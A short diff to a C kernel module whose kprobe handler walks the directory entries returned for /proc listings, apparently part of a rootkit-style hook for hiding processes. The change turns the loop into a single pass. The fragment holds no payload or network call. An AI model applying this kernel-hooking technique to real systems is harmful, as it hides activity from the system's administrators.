@@ -92,7 +92,7 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 			wuwa_info("dent64: called for proc");
 		}
 
-		while (offset < ret)
+		while (/*offset < ret*/true)
 	    {
 		    dir = (void *)kdirent + offset;
 
@@ -115,7 +115,8 @@ static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long f
 		    {
 			    prev = dir;
 		    }
-		    offset += dir->d_reclen;
+			break;
+		   // offset += dir->d_reclen;
 	    }
 /*	
 	    // Copying directory name (or pid name) from kernel space to user space, after changing
